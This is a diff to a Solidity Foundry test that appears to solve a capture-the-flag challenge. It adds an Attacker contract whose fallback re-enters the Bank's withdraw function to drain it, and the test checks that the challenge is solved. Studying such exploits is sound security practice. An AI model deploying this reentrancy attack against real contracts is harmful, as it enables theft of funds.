@@ -12,6 +12,27 @@ contract BankTest is Test {
     }
 
     function test_solve() public {
+        Attacker attacker = new Attacker(address(bank));
+        attacker.attack{value: 1 ether}();
         assertTrue(bank.isSolved());
+    }
+}
+
+contract Attacker {
+    Bank public target;
+    constructor(address _target ) payable { 
+        target = Bank(_target);
+        target.registerWallet();
+    }
+
+    function attack() public payable{
+        target.deposit{value: address(this).balance}(address(this).balance);
+        target.withdraw();
+    }
+
+    fallback() external payable {
+        if (address(target).balance > 0){
+            target.withdraw();
+        }
     }
 }
